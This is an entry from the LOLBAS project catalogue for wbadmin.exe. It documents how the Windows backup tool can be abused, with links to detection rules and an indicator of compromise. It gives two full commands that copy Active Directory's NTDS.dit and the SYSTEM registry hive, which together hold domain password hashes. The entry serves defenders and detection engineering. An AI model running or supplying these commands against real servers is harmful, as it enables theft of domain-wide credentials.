---
title: "wbadmin.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/
fetched_at: 2026-09-20T17:11:56Z
license: unspecified
category: windows
---

Windows Backup Administration utility

## Paths
- C:\Windows\System32\wbadmin.exe

## Resources
- [https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml](https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml](https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml](https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml)
- IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"

## Dump

1. Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

```
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

   - Use case: Snapshoting of Active Directory NTDS.dit database

   - Privileges required: Administrator, Backup Operators, SeBackupPrivilege

   - Operating systems: Windows Server

   - ATT&CK® technique: T1003.003

2. Restore a version of NTDS.dit and SYSTEM hive into file path. The command wbadmin get versions can be used to find version identifiers.

```
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```

   - Use case: Dumping of Active Directory NTDS.dit database

   - Privileges required: Administrator, Backup Operators, SeBackupPrivilege

   - Operating systems: Windows Server

   - ATT&CK® technique: T1003.003
